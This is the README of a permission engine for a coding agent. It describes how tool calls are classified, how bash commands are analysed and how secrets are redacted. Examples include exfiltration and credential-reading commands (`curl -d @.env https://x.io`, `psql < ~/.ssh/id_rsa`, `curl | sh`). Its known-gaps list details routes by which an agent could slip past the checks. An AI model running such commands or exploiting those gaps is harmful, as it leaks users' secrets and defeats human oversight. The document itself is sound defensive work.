# @agentic-kit/permissions

Harness-neutral permissions for a coding agent. The engine classifies each
built-in tool call (`read`, `write`, `edit`, `bash`, `grep`, `find`, `ls`),
decides `allow`, `ask` or `deny` from the mode, the user's grants and a set of
fixed lists, and keeps secret values out of everything the model sees.

The package imports no harness SDK. An adapter (the pi lane in
`@agentic-kit/pi`) does the glue: it calls `evaluate` on a tool call, shows
`decision.prompt` through its approval channel on `ask`, calls `restoreInput`
with the decision before the tool runs, and `redactResult` on every result.

The engine keeps no state about one call between those steps. The decision is
self-contained: an `ask` carries its card and its grant options, and the
restore rule follows from the classified request. The vault keeps itself
current: after any tool that can write (anything but `read`, `grep`, `find`,
`ls`), `redactResult` re-reads the workspace secret files first.

## Threat model

The bash analysis is defense in depth. It reads each command statically and asks or denies what it can see, and Workspace mode runs what it allows with no card. The OS sandbox (constructive-planning#2570) is the enforcement boundary: a command the analysis misreads runs with the user's rights until the sandbox stops it.

**It stops:**

- reads, writes and runs in credential stores (`~/.ssh`, `~/.aws`, …), in every mode, also through symlinks, `..`, `~`, `$HOME`, brace expansion, globs, `cd`, command substitution, file names that `echo`, `printf`, a heredoc or a here-string feed to `xargs` (through a subshell, a `{ …; }` group, `if` or a loop around it too), the keychain CLI (`security find-generic-password`, …), and the shell command a program runs from its own text when the analysis can read it: psql's `\!`, a pipe from `\o`, `\g`, `\gx` or `\w`, a backquote and `COPY … PROGRAM`, sqlite3's and duckdb's `.shell`/`.system` under any abbreviation (`.sys`, `.sh`) and sqlite3's `.output |`, mysql's `system`/`\!` and `pager`/`\P`, gdb's `shell`/`she`/`!`, vim's `!`, and option values such as tar's `--to-command`/`-I`, zip's `-TT`, rsync's `-e`, ssh's and scp's `-o ProxyCommand=…`, and man's `-P`, from an option, an argument, a pipe from `echo`/`printf`, a here-string or a heredoc;
- the escapes of a program's own command language, outside Full mode. Text counts as plain only when it uses none of them, and the allowlists come from each tool's own help: for psql, SQL and the meta-commands that only describe the database or format output (`\d…`, `\l`, `\x`, `\echo`, …) with no pipe, `:variable` or backquote; for sqlite3 and duckdb, the full spelling of the read-only dot-commands (`.tables`, `.schema`, `.mode`, `.headers`, …); for sqlite3, SQL with no `ATTACH`, no `VACUUM` and none of the functions its CLI adds that touch files or run SQL from a string (`readfile`, `writefile`, `fsdir`, `zipfile`, `edit`, `sha3_query`, `load_extension`); for duckdb, SQL with no `INSTALL`/`LOAD` (its SQL file access is a gap, below); for mysql, SQL and the client commands that only show or end a statement (`\G`, `go`, `use`, `status`, …); for gdb, no command text at all. Everything else, an abbreviated dot-command, `\i`, an output file (`.output f`, `\o f`, `tee f`), sqlite3 SQL that reads or writes a file (`readfile(…)`, `ATTACH`) or a gdb `-ex`/`-x`, asks. Full mode runs it, like `python -c`; hard-deny there waits for the sandbox (constructive-planning#2570). Text on stdin is read from a heredoc, a here-string, or the exact output of `echo` and `printf`, in every way the shell may print it. Stdin from a file that a `<` redirect names is read like a file the program runs by name: it stays quiet, and the path is checked as a read, so `psql < ~/.ssh/id_rsa` is denied;
- writes to the agent's own extension dir (`<ws>/.pi`), the trusted harness roots and the host's protected paths, in every mode;
- silent writes to files that run code later (git hooks, `.git/config`, `.husky`, `.envrc`, `.vscode/tasks.json`, and package-manager config: `.npmrc`, `.yarnrc`, `.yarnrc.yml`, `.yarn/releases`, `.yarn/plugins`, `.pnpmfile.cjs`, `bunfig.toml`) outside Full mode;
- silent access outside the project outside Full mode;
- bash commands that upload data (including `git push` to a new remote, publishing a package, a secret file on the clipboard), destroy data, run as root, run code the analyzer cannot see (`eval`, `sh -c`, `node -e`, `$(…)`, a heredoc into an interpreter, a git option that runs a program such as `git fetch --upload-pack=…`, `git grep -O…` or `git rebase -x …`), outlast the session (`crontab`, `launchctl load`), expose the machine (`python -m http.server`, `ngrok`), or take file names from stdin that it cannot see (`find | xargs …`), outside Full mode;
- a secret leaving in a form redaction cannot match: a secret file copied into a plain file or through a program that changes its text (`base64 .env`), and a secret env var expanded in a command (`$OPENAI_API_KEY`), outside Full mode;
- secret values reaching the model: `.env` values and token-shaped strings are replaced with placeholders in every tool result, also when a value is split across two adjacent text blocks;
- a path the analyzer cannot place (built from a variable or a substitution, a `${VAR:-…}` fallback it cannot know, a `~user` home, a zero-padded or stepped brace sequence such as `{01..10}`, which bash 3.2 and bash 4+ expand differently, a `~` after the command sets HOME, which bash 3.2 and bash 5.3 expand differently, a word from a variable where a program takes a file or an option, such as `cat --$_` or `env --chdir=$X`, a curl body, form or header from a variable, which may name a file (`curl -d "$BODY"`), or any relative operand after a `cd` or `-C` it cannot follow): it asks in every mode, Full included, so no mode lets an unknown path reach a credential store. One caveat for Full mode: it allows `shell-dynamic`, so it still runs code that only exists when the command runs, such as `eval "$(…)"` or `bash -c "$(… | base64 -d)"`, and such code can read a credential store.
- a command the analyzer reads only in part because it reached one of its own limits (command substitutions nested more than 6 deep, shell strings such as `sh -c` or `eval` nested more than 4 deep, a command longer than 64 KB, or expansions that build more than 1 MB of text or more than 8192 words), or because its lexer cannot parse the command or a substitution in it: it asks in every mode, Full included, since the part it did not read can touch any path.

**It does not stop** (known gaps in v1):

1. A script the agent writes and then runs (`node upload.js`) can read `.env` and send it out. Static analysis cannot see into it; only an OS sandbox can (constructive-planning#2570). The same holds for every program that runs code from its own text where the analysis cannot read it: credential-store denial (hard-deny) holds for the programs the analyzer models, and a program that runs a shell from its own text it does not model can still reach a credential store. A psql, sqlite3 or mysql session fed from another program's output (`cat q.sql | psql`), and PowerShell, Tcl (`expect -c`) and vim commands, ask outside Full mode, and Full mode runs them. A file the program runs by name (`psql -f setup.sql`, `mysql < dump.sql`) is not read, like a script. SQL that a database server runs is not read either: a server function, an extension or dynamic SQL in psql or mysql can reach any file the server process can. duckdb's SQL reads and writes files too, and Workspace and Full mode both run it with no signal: a quoted name is a file (`select * from '~/.ssh/id_rsa'`), the `read_*` functions and `COPY … TO` take paths, and a path needs no quote at all (`read_text(chr(47)||…)`, `copy … to (chr(…))`, `set log_query_path = chr(…)`). The rest of that long tail waits for the sandbox.
2. Bash analysis is best effort. Exotic forms can pass: a glob through a symlink that already sits in the project, values built across several steps, aliases in an interactive shell, or a program that writes where its arguments do not say. A word built from a variable is a path only where the analyzer knows the position holds one (a path-like word, a redirect, the operands of the file readers `cat`, `head`, `base64` and the like); `[ -n "$X" ]` and `npm install $PKG` stay quiet, so a program that is not on that list can take a path from a variable unseen. A plain `*` is matched with bash's default rule (it does not match dotfiles) unless the command mentions `dotglob`, `GLOBIGNORE` or `globdots`. Only an OS boundary is a real security boundary.
3. Dev servers and scripts read `.env` as processes. That is by design; redaction covers only what goes back to the model. `--env-file .env` is treated as such a load, not as a transform. Which programs count as transforms is a list: the verbatim readers (`cat`, `head`, `tail`, `less`, `more`, `bat`, the `grep` family, `wc`, `diff`, `tee`, `sort`, `uniq`, `nl`) and commands that print nothing of what they read (`ls`, `test`, `cp`, `git`, …) are not; everything else that reads a secret file is.
4. Streaming tool output reaches the local UI before redaction. The bash full-output temp file holds raw text (a later `read` of it is redacted).
5. Secrets shorter than 8 chars, or under a key name that does not look secret and with no token shape, are not redacted. Common local-dev defaults (`password`, `postgres`, `changeme`, …) are not redacted either, so ordinary source text stays readable.
6. A recursive read of a folder that holds a credential store (`grep -r x ~`) asks in Workspace mode and is allowed in Full mode; only output redaction applies then.
7. Time of check vs. time of use: a path can change between `evaluate` and the tool's `open`.
8. A command-prefix grant covers a listed program with any later arguments the rules above allow, so in Ask mode it still runs without a card when the program itself turns an argument into code: a script that evaluates its own arguments (`python3 manage.py shell -c …` under the prefix `python3 manage.py`), or an option a package script passes on to its tool that the risky list does not name (`npm test -- --setupFiles x.js`). Workspace mode runs these without asking in any case.
9. curl's `-O` and `-J`, and wget without `-O`, write a file named by the URL or the server into the working dir (or `--output-dir`, `-P`), which the analysis does not add as a write, and a write-out format curl reads from a file (`-w @fmt`) can write a file with `%output{…}` the analysis does not read. Both programs take options anywhere on the line, so an argument from a variable that may be an option (`curl "$URL"`, `curl $URL`) asks in every mode, like any path the analysis cannot place; one whose literal start is plain text (`curl "http://localhost:$PORT/x"`) is no option.
10. The list of git options and subcommands that run a program (see `shell-dynamic` below) is best effort. One it does not list, or a program that git config names (an alias, a hook, a diff driver), runs with no card in Workspace mode; config files in the repo are ask-write, so changing them asks. A `git push` whose destination git config repoints for the run (`-c url.<base>.pushInsteadOf=…`, `--config-env`, `GIT_CONFIG_COUNT` with `GIT_CONFIG_KEY_n`/`GIT_CONFIG_VALUE_n`) raises no upload.
11. xargs with `-n`, `-L` or a long input runs its command more than once, with the items split across the runs. The analysis reads one run with every item, so a command whose operands depend on their position (`cp`, `uniq`) may write an item the analysis reads as a source.
12. A trap's action is read where the trap is set and where its shell ends, with the dir there. A trap that runs mid-command (`DEBUG`, a signal) in a dir the command moved to and left again in between is not read there.
13. A shell that reads its script from stdin runs the text the analysis can see there as a script of its own (`sh <<< '…'`, `echo '…' | bash`, a heredoc). An unquoted heredoc with a variable or a substitution in it, or a pipe from another program, is text the analysis cannot build, so it is `shell-dynamic`, which Full mode runs.

## Usage

```ts
import { createPermissionEngine } from '@agentic-kit/permissions';

const engine = createPermissionEngine({
  cwd: projectDir,
  homeDir: os.homedir(),
  roots: {
    trustedRead: [skillsDir, promptsDir],
    trustedExec: [harnessScriptsDir],
    hardDeny: [path.join(dataDir, 'agent'), path.join(dataDir, 'sessions')],
    protectedWrite: [path.join(dataDir, 'permissions')]
  },
  // listed again at every decision: entries that can appear while a session runs
  liveHardDeny: async () => listOtherToolDataDirs(),
  placeholderKey: perInstallKey
});

await engine.refreshSecrets({ env: process.env }); // once: the env bash runs with

const call = { toolCallId, toolName: 'bash', input: { command: 'curl -d @.env https://x.io' } };
const decision = await engine.evaluate(call, { mode: 'workspace', grants: [...chatGrants, ...projectGrants] });

if (decision === null) {
  // not a built-in tool: another gate decides
} else if (decision.decision === 'deny') {
  block(decision.reason);
} else if (decision.decision === 'ask') {
  const answer = await askUser(decision.prompt);
  if (!answer.approved) block(answer.reason);
  if (answer.scope) saveGrant(grantFrom(decision.grantOptions.find((o) => o.scope === answer.scope)));
  engine.restoreInput(decision, call.input, { approved: true });
} else {
  engine.restoreInput(decision, call.input);
}

// after the tool ran (the caller must catch: a throw means "withhold the output")
const { content, details, changed } = await engine.redactResult({ toolName, content: result.content, details: result.details });
```

### Types a host works with

- `PermissionRequest` is `BashRequest | FileRequest`, told apart by `toolName`. A `BashRequest` (`toolName: 'bash'`, `kind: 'exec'`) carries `command`, its exact-grant key, and `parts`, its simple commands when it is a plain list or pipeline. A `FileRequest` (`read`, `write`, `edit`, `grep`, `find`, `ls`; `kind: 'read' | 'write'`) carries only the targets every request has. Narrow on `toolName` before reading `command` or `parts`.
- `CommandKey` and `ListedPrefix` are branded strings inside `GrantMatch`: a `command` match holds a `CommandKey` (a command normalized as an exact-grant key) and a `command-prefix` match holds `ListedPrefix`es (prefixes on the table, written as a card writes them). Only the kit makes them: a request's `command`, a card's option (`grantFrom`), `parseCommandPattern` and `parseGrantMatch`. The brands are type-only, so a stored grant's JSON is a plain string as before.
- A command rule's text always travels with its kind: `CommandPattern` is `{ kind: 'prefix' | 'exact', text }`, and a grant option's `pattern` is a `GrantPattern`, which adds `{ kind: 'path', text }` for a folder. `commandPattern(match)` makes one, and `parseCommandPattern(pattern)` reads one back. A host shows `text` and keeps `kind` beside it; it never works out the kind from the text.
- A host that loads grants from disk reads each match through `parseGrantMatch` and drops the ones that come back `null`, so an edited or damaged file never reaches the engine as a grant:

```ts
const grants = stored.flatMap((g) => {
  const match = parseGrantMatch(g.match);
  return match ? [{ ...g, match }] : [];
});
```

### Engine API

| Member | What it does |
|---|---|
| `evaluate(call, { mode, grants, rules? })` | Classify and decide one call. `null` for a tool that is not a pi built-in. An `ask` carries `prompt` (title, summary, targets, one reason per signal, grant options) and `grantOptions`. |
| `restoreInput(decision, input, { approved? })` | Put real values back in place: write/edit to a secret file always, bash only when `approved`. Everything else keeps placeholders as literal text. |
| `redactResult({ toolName, content, details })` | Re-read the secret files when the tool can write, then replace known values in text blocks and in every string inside `details`. Images stay as they are. Throws on internal error. |
| `refreshSecrets({ values?, env? })` | Re-read the workspace secret files. `values` and `env` are host-provided and kept across refreshes. |
| `addSecret(name, value)` | Add a value the host knows is secret (a minted API key). |

`liveHardDeny` (an option, not a member) lists more hard-deny paths at every decision, for entries that can appear during a session; a throw fails the decision, so the call is blocked.

Other exports: `scrubEnv` (a copy of an env without the variables that are secret by name, unless the value is a path, or by token shape, URL passwords included, and without `BASH_ENV`, `ENV` and `CDPATH`, which change how the shell starts and resolves paths: what a host gives the agent's shell), `grantFrom` (the `Grant` an option saves), `describeGrant`, `sameMatch`, `commandPattern` and `parseCommandPattern` (the text form of a command grant, see Grants), `grantCaveat` (the caveat a host shows beside a stored grant, see Grants), `parseGrantMatch` (a stored grant's match checked by the rules the engine saves grants with, or `null`: a host calls it when it loads its grant store and drops what fails), `GrantStore` and `memoryGrantStore`, `nodeFsProbe`, the fixed lists (`HOME_HARD_DENY`, `WORKSPACE_PROTECTED_WRITE`, `WORKSPACE_ASK_WRITE`, `defaultHardDeny`, `defaultTempDirs`), `isSecretFile`, the placeholder format, and the types. Classification, the policy, the bash analyzer and the vault are internal.

`FsProbe` is the only fs access (`realpath`, `lexists`, `readFile`, `readDir`, `size`). `nodeFsProbe` is the default and the only module that imports `node:fs`.

## Decisions

### Zones

Every target is canonicalized (the deepest existing ancestor is realpathed and the missing tail added back, `..` resolved after the links before it). Then, most specific first:

`hard-deny` > `protected` (writes) > `ask-write` (writes) > `trusted` (read; run only for `trustedExec`) > `workspace` > `temp` > `outside`.

A path that goes through a dangling symlink, a link loop or an entry that cannot be inspected is `unresolvable`. The restrictive lists also match the path as the agent spelled it, and match case-insensitively on macOS and Windows.

### Precedence (first match wins)

1. A hard-deny target, or a write to a protected target: **deny**. No grant changes this.
2. A user deny rule: **deny** (reserved; no rule editor in v1).
3. Chat grants, then project grants, that cover the call (one grant alone, or part by part for a plain bash chain with no signal): **allow**.
4. A user allow rule: **allow** (reserved).
5. The mode default:

| Situation | Ask | Workspace | Full |
|---|---|---|---|
| read in workspace, trusted, or temp | allow | allow | allow |
| write in workspace or temp | ask | allow | allow |
| bash with no signal | ask | allow | allow |
| bash with a signal (dynamic, sudo, upload, destructive, stdin operands, persistence, network exposure, clipboard, secret transform, secret env var) | ask | ask | allow |
| a `«secret:…»` placeholder in a command | ask | ask | ask |
| outside the workspace (read, write, run) | ask | ask | allow |
| ask-write path | ask | ask | allow |
| secret into a plain file | ask | ask | allow |
| secret-file read | allow (redacted) | allow (redacted) | allow (redacted) |
| unresolvable path | ask | ask | ask |

Every `ask` and `deny` reason starts with `permissions: ` and names the path or the cause, for example `permissions: reading ~/.ssh/id_ed25519 is not allowed (SSH keys; blocked in every mode)`, and a deny, or an ask because the analysis did not read the whole command, ends with the model's next step (`src/guidance.ts`, the only place that wording lives): don't reach a blocked path another way and ask the user, or rewrite an unread command as simpler commands.

### Grants

- **Path grants** (`{ type: 'path', access, pathPrefix }`) cover a file-tool call when every target is inside `pathPrefix` with the same access. The prefix is the canonical parent dir of the target (the common parent of several). Label: `Always allow reads in ~/work/lib/`.
- **Command grants** (`{ type: 'command', command }`) cover a bash call whose command is identical after each run of spaces and tabs between two of its tokens becomes one space; the key is built from the lexer's tokens. The text inside a token (a quoted string, `${…}`, a substitution) and a heredoc body stay as written, and so do newlines, `\r`, NBSP and every other character, because bash can run two such spellings differently (`./x #; curl …` runs only `./x`, `./x\r#; curl …` runs the curl, and `${x/ /-}` differs from `${x/\t/-}`). A command the lexer cannot read keeps all its spacing. Label: `Always allow exactly: <the command>`. No wildcards. In a plain chain with no signal (see below), one also covers a part that is exactly its command and writes no file. An exact grant that 0.2.0 saved for a multi-line command, or for a command with a quote or a `$` written with double spaces or tabs, no longer matches that command; it asks again.
- **Command-prefix grants** (`{ type: 'command-prefix', prefixes: ['git status', 'npm run test'] }`) cover later runs of the same command with other arguments, part by part. Each prefix is leading words joined by one space. Options that run other programs or write files still ask. A call is covered only when all of these hold:
  - it raises no signal at all, `secret-file` included, so code the analyzer cannot see (`node -e`, `bash -c`, `$(…)`, `$((…))`, `eval`), uploads, `sudo` and destructive forms never get a prefix;
  - it writes no file the analysis sees: a target with write access (`touch`, `mkdir`, `sort -o`, `tree -o`, `uniq IN OUT`, git `--output`), or an output redirection (`>`, `>>`, `>|`, `&>`, `<>`) to anything but the literal `/dev/null`, so `2> err.log` and `> /dev/stdout` count. A copied descriptor (`2>&1`, `>&2`) and input (`<`) do not;
  - it is a plain list or pipeline: no `if`, `for`, `while`, `case`, `{ … }`, function, substitution, heredoc, here-string or `\r`, and no `cd`, `pushd` or `popd`, which would point the relative paths of later parts somewhere else, so `cd packages/x && pnpm test` always needs an exact rule;
  - every simple command in it either starts, word by word, with a prefix the table lists (below) from this grant or another one, or is exactly an exact grant's command, and passes no risky option (below). A word that may hold an option the lexer cannot read counts as risky: one with an unquoted variable or an unknown part anywhere in it (word splitting turns `HEAD$IFS--upload-pack=x` into two words), one that starts with a quoted variable, and one whose brace expansion is cut off at its limit.

  So the prefix `git status` covers `git status --short`, not `git log`, `git statusx` or `git status > s.txt`; `git status && npm test` needs both parts covered; and the prefixes `npm test, tail` cover `npm test --watch 2>&1 | tail -50`. A call that fails any of these is covered only by an exact grant of the whole command, and its card offers only the exact command. The exception is a call that raises `unresolvable-path`, `placeholder-in-command` or `secret-into-plain-file`: it gets no grant options at all, and even an exact grant of it asks (see the rule on grants below). A prefix covers only what Workspace mode runs without asking, so it mainly saves prompts in Ask mode. Label: `Always allow commands that start with git status or npm run test` (three or more read `git status, git log or npm test`); `describeGrant` gives the same words without `Always allow`; `sameMatch` compares the prefixes as a set.
- **What "allow again" offers on bash.** For a call that a prefix could cover, both options save one prefix for each part that no held grant covers yet (the project option counts only project grants, so it still holds in the next chat), at most 5. The option is the exact command instead when the call fails a rule above, a part's program is not in the table, a part is shorter than its entry or has an option or a non-literal word (quote, `$`, glob, `~`) inside its prefix (`git -C src status`), or the chain needs more than 5 prefixes.
- **The arity table.** A prefix is offered, and held, only when a listed entry's own words run no code taken from the arguments after them. The `script-runner`, `package-script` and `test` classes do run a script the kit does not read: that is the script caveat below, and known gap 8. For example, `python3 manage.py shell -c …` runs under the prefix `python3 manage.py`, and `npm test -- --setupFiles ./x.js` under `npm test`. Each entry has a class (in parentheses below), and a caveat comes from the class:
  - 1 word, readers and filters (`reader`): `cat`, `head`, `tail`, `wc`, `ls`, `pwd`, `echo`, `grep`, `cut`, `diff`, `jq`, `which`, `stat`, `du`, `df`, `date`, `sleep`, `basename`, `dirname`, `realpath`.
  - 2 words, a git subcommand that only reads or adds to the repo (`vcs`): `git` `status`, `diff`, `log`, `show`, `add`, `commit`, `branch`, `tag`, `fetch`, `blame`, `grep`, `ls-files`, `rev-parse`, `describe`, `shortlog`, `reflog`.
  - 2 words, a package manager subcommand that runs the project's tests (`test`): `npm test`, `npm t`, `pnpm test`, `pnpm t`, `yarn test`, `bun test`; or reads package data (`package-query`): `npm` `ls`, `outdated`, `view`, `why`, `explain`; `pnpm` `ls`, `list`, `outdated`, `why`; `yarn` `why`, `info`.
  - 2 words, an interpreter and its script (`script-runner`): `node`, `python`, `python3`, `ruby`, `bash`, `sh`, `zsh`, `tsx`, `ts-node` (`node scripts/build.js`); 3 words after `tsx watch` and `node inspect`, so the script stays in the prefix (`tsx watch src/index.ts`).
  - 3 words, a package script by name (`package-script`): `npm run`, `pnpm run`, `yarn run`, `bun run` (`npm run test`).
  - Everything else keeps the exact command: a program that runs or fetches code an argument names (`npx`, `bunx`, `npm init`/`x`/`exec`/`install`, `pnpm create`/`dlx`/`exec`/`add`, `yarn dlx`/`create`, `bun x`/`create`, `deno run`, `go run`, `cargo run`, `docker run`, `python -m`, `make`, `gh`, `git bisect`, `git submodule`, `git remote`, `git config`), one that writes files (`touch`, `mkdir`, `sort`, `uniq`, `tree`), one whose options run a program (`rg --pre`, `printf -v`, `less`), a git subcommand that can discard uncommitted work or rewrite or publish history (`git` `reset`, `rm`, `mv`, `checkout`, `restore`, `switch`, `stash`, `push`, `pull`, `merge`, `rebase`, `cherry-pick`, `revert`), the wrappers (`env`, `timeout`, `nohup`, `xargs`), `cd`, `rm`, `mv`, `cp`, `sed`, `awk`, `find`, and any program it does not list. A word that starts with `-` or `+` is an option, so `bash +x deploy.sh` gets the exact command, and a word with `,` keeps the exact command too, since `,` separates prefixes in the text form (`npm run a,b`). A leading assignment (`NODE_ENV=test npm test`) is a word of its own, so a call with one gets the exact command too. A prefix grant that 0.2.0 saved for a git subcommand the table no longer lists (`git push`, `git reset`, …) fails `parseGrantMatch` and covers nothing; it asks again, and its card offers the exact command.
- **The script caveat.** A prefix of class `script-runner` (`node scripts/build.js`, `python3 manage.py`, `bash deploy.sh`, `tsx watch src/x.ts`), `package-script` (`npm run build`) or `test` (`npm test`) covers later runs of a script, but the kit never reads the script, the package script's command or the tests, and the agent may have changed them. So the kit marks such a rule with `caveat: 'script-unchecked'`: on each card option that saves one (`GrantOption.caveat`, and the same field in `prompt.grantOptions`), on `parseCommandPattern`'s result for a typed one, and from `grantCaveat(match)` for a stored one. A rule with several prefixes gets it when any of them has one of these classes. An exact command, a path grant and the `reader`, `vcs` and `package-query` classes get none. The kit gives only the value; the host writes the sentence it shows.
- **Risky options** come from the program registry (`src/bash/programs.ts`), the same table the analyzer reads options with: an option or operand is risky when it runs a program, writes a file, sets config, moves to another dir, sends data elsewhere, or rewrites or deletes history (`commit --amend`; `branch -d`/`-D`/`-f`/`-M`/`-C`; `tag -d`/`-f`; `reflog expire`/`delete`; `fetch` with a `+` refspec, `-f`, `-P`/`--prune-tags` or `-u`/`--update-head-ok`), so a prefix never covers it and its card offers only the exact command. For git that is per subcommand: `--output`, `--ext-diff` and `--textconv` on the diff commands, `-o` on archive and format-patch, `--upload-pack` on fetch, pull, clone and ls-remote (`-u` on clone and ls-remote), `-c`/`--config` and `--template` on clone, `--exec`/`--receive-pack`/`--repo` on push, `-x`/`--exec` on rebase, `-O`/`--open-files-in-pager` on grep, `-x`/`--extcmd` on difftool, the filters on filter-branch, the `--*-cmd` options on send-email, and `--file` on config; a subcommand the registry does not list, or an alias, counts every one of these. npm, pnpm and yarn: `--script-shell`, `--node-options`, `--userconfig`, `--globalconfig`, `--config`, `--prefix`, `-C`, `--dir`, `--cwd`; bun: `--preload`, `-r`, `--require`, `--config`, `-c`, `--cwd`. Options are read after quote removal and brace expansion, past `--` too, because git takes `--` as the value of an option that needs one and goes on reading options (a risky name after a real `--` only costs a card); a short one also matches inside a cluster (`-ix`) and a long one by an abbreviation (`--upl`, `--conf`), because git and getopt accept both, and an exact name wins over an abbreviation. git's own `-c` comes before the subcommand, where no git prefix can match; after it, `-c` means "create" or "count". A read is not a risky option: the analyzer checks the file it reads like any other path.
- **The text form.** A command rule is text plus its kind, so the text never has to say which kind it is. `commandPattern(match)` gives the `{ kind, text }` a card's option carries as `pattern`: `{ kind: 'prefix', text: 'git status, npm run test' }`, the prefixes joined by `, `, or `{ kind: 'exact', text: 'rm *' }`, the command as written. `parseCommandPattern({ kind, text })` reads a rule a person typed (the Settings editor, with a kind picker) back into a match of that kind, or gives `{ ok: false, reason }`, a short sentence that says what is wrong and how to fix it.
  - An `exact` text is one command, `*` and commas kept (`rm *`, `echo a, b`). It may not hold a `«secret:…»` placeholder, because such a call is never covered.
  - A `prefix` text is one or more prefixes separated by commas. Each one must lex to one simple command of plain words with no option, quote, `$`, glob, `~`, `,`, redirection, operator or substitution, may not start with a shell keyword, and must be one the table lists, at least as long as its entry: `git`, `npm run` and `printf` are refused, so a typed rule is never broader than a card would offer. A trailing ` *` is refused too, with a reason that says to remove it: a prefix already covers whatever follows its words, and one spelling per rule keeps the round trip exact. An empty part (`git status,`) is refused. Duplicates are dropped, and a rule holds at most 5 prefixes, as a card does.
  - Text of either kind longer than 64 KB, the most the engine checks in a command, is refused.
  - Every label and refusal reason lives in one module (`src/grant-copy.ts`). Reasons mark commands and words with backticks, so a host can show them as code; labels are plain text.
- **Round trip.** `parseCommandPattern(commandPattern(m))` gives back `m` for every prefix match and every exact command, `rm *` and `echo a, b` included, so a host can save a grant again from the text and kind it shows.
- Deny and allow rules (`RuleMatch`) take path and exact command matches only.
- A grant never matches on a tool name, a path grant never covers bash, and a command grant never covers a file tool.
- No grant is offered for, or covers, a call with `unresolvable-path`, `placeholder-in-command` or `secret-into-plain-file`: each one needs its own yes.
- No path grant is offered for, or covers, a target with an unexpanded glob outside the project: a folder cannot say where the glob expands to.

### Bash signals

| Signal | Raised by |
|---|---|
| `shell-dynamic` | code the analyzer cannot see before it runs: substitutions, shell strings, inline interpreter code, and the other forms listed below |
| `unresolvable-path` | a path the analyzer cannot place, or a command it read only in part (the forms are listed below). Asks in every mode and is never grantable |
| `sudo` | `sudo`, `doas`, `pkexec`, `su` |
| `upload` | data leaving the machine: curl and wget uploads, a push or publish, and the other forms listed below |
| `destructive` | `rm -r/-f`, `rimraf`, `shred` on a target outside the workspace or temp dirs, on a workspace or temp root itself, or on targets not known until it runs (`xargs rm`); `chmod -R`/`chown -R`, `dd of=`, `find -delete`, `git reset --hard`, `git clean -f` outside the workspace; `git push --force`/`--force-with-lease`/`--mirror`/`--delete` or a `+` refspec; `mkfs*`, disk tools, `dd` to a device, `diskutil` with a verb from a variable; the oh-my-pi critical patterns (fork bomb, `curl \| sh`, `shutdown`, …) |
| `placeholder-in-command` | a `«secret:…»` placeholder anywhere in the command |
| `stdin-operands` | `xargs` whose items cannot be seen: input from a file, a `<` redirect, a copied fd (`<&3`) or a pipe from anything but `echo`/`printf`, output the analysis cannot build, or `-0`, `-d`, `-a` or an option from a variable; `cpio -o`, `tar -T -`, `zip -@`, `rsync --files-from=-` |
| `persistence` | `crontab` (any form but `-l`), `at`, `batch`, `launchctl load/bootstrap/submit/enable`, `defaults write/import`; `launchctl` or `defaults` with its action from a variable |
| `network-exposure` | `python -m http.server` (unless `--bind` is loopback), `SimpleHTTPServer`, `php -S`, `ruby -run -e httpd` and `busybox httpd` on a non-loopback address; `ngrok`, `cloudflared`, `localtunnel`/`lt`, `ssh -R` |
| `clipboard` | `pbcopy`, `pbpaste`, `xclip`, `xsel`, `wl-copy`, `wl-paste` |
| `secret-transform` | a secret file read by anything but a verbatim reader, or piped into one (`base64 .env`, `cat .env \| rev`, `head -c`, `grep -o`); not raised when the command already uploads |
| `secret-env-expansion` | `$NAME` or `${NAME…}` (heredoc bodies too) where `NAME` matches the secret key rule or holds a secret the host passed in `refreshSecrets({ env })`, and the command did not set it itself |
| `secret-into-plain-file` | `cp`, `mv`, `install`, `tee`, `dd` or a `>` redirect from a secret file into a file that is not one (a dir keeps the name); `git add -f` of a secret file or of a file named by a variable |

**`shell-dynamic`** is raised by `$(…)`, backticks, `<(…)`, `${…}` with an operator, `eval`, `source`/`.`, `sh/bash/zsh -c`, `node -e/-p`, `python -c`, `perl -e`, `ruby -e`, `deno eval`, `osascript -e` (in every spelling: `-ec`, `-cX`, `--eval=X`), a shell option word it cannot read, an awk program with `system()`, code piped or heredoc'd into an interpreter, a function definition, assignments that change what runs or loads (`PATH=`, `LD_PRELOAD=`, `NODE_OPTIONS=`, `PYTHONPATH=`, `CDPATH=`, …), `test -v` and `[[`'s arithmetic comparisons (they evaluate array subscripts), arithmetic with a name in it (`$((x))`, `$[x]`, `((i++))`, `let`, `declare -i`: a variable's value is read as an expression, and a subscript in it runs code; numbers and operators alone, as in `$((1+2))`, do not count, but only where bash reads arithmetic: `$((…))` only when the parens between `$((` and `))` balance, counting those inside backticks, and `((…))` only when its second paren closes right before a `)`; otherwise they are a command substitution or subshells, and `$((1) | cmd )` runs `cmd`), an option from a variable where `declare`, `local`, `typeset`, `printf` or `read` expects one (`declare $_ …` after `echo -i`), a git option or subcommand that runs a program (`--upload-pack` on fetch and pull, `-u`/`--upload-pack`/`--template` on clone and `-u`/`--upload-pack` on ls-remote, `--exec` on archive, `--receive-pack`/`--exec` on push, `-x`/`--exec` on rebase, `-O`/`--open-files-in-pager` on grep, `-x`/`--extcmd` on difftool, a filter or `--setup` on filter-branch, `--to-cmd`/`--cc-cmd`/`--header-cmd`/`--sendmail-cmd` on send-email, `git bisect run`, `git submodule foreach` (also with the action word from a variable); in clusters and abbreviations, past `--`, and for any argument from a variable there, so `git push origin $BRANCH` asks in Workspace mode), `git --config-env`, `git -c` or `git clone -c` with a key that runs a program, a name reference (`declare -n`, `local -n`, `typeset -n`, also as `-rn`), `~user` at the start of a brace alternative, `printf -v`, `read`, `declare` or `unset` on an array element or on a name from a variable, `printf -v` or `read` into a name such as `PATH`, a command name from an unknown variable or a glob (`$CAT`, `/???/cat`; its operands are still checked as files), a git global option or subcommand, a `git -c`/`--config-env` key, a busybox applet or a find expression word from a variable, `export $N=…` (it may set PATH or IFS), and a shell string from words (`watch`, `sudo -s`, `su -c`, `eval`) when one of them comes from a variable, an `env -S` value the analysis cannot split (one with a `$`, or one from a variable), and a `trap` action from a variable.

